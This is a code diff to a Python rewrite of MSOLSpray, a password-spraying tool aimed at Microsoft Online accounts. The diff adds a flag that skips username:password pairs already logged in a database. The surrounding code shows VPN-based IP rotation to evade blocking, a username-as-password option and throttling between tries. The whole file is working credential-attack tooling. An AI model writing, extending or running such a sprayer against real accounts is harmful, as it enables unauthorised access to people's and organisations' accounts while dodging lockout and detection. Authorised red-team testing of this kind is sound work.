@@ -4,7 +4,7 @@ import time
 import datetime
 import sys
 from nordvpn_switcher import initialize_VPN,terminate_VPN
-from utils import configure_logger, safe_rotate_vpn, get_public_ip, init_db, log_event
+from utils import configure_logger, safe_rotate_vpn, get_public_ip, init_db, log_event, has_user_password_been_tested
 
 description = """
 This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!
@@ -30,6 +30,7 @@ parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernam
 parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")
 parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
 parser.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
+parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
 
 args = parser.parse_args()
 
@@ -77,6 +78,16 @@ if vpn:
             LOGGER.info(f"[VPN] Initial public IP: {prev_ip}")
 
 for username in usernames:
+    if args.skip_tested:
+                try:
+                    already = has_user_password_been_tested(username, password)
+                except Exception as e:
+                    LOGGER.warning(f"[DB] Error during the user:password check: {e}")
+                    already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
+                if already:
+                    LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
+                    continue  # passe au suivant
+
     if username_counter>0 and sleep>0:        
         time.sleep(sleep)
     
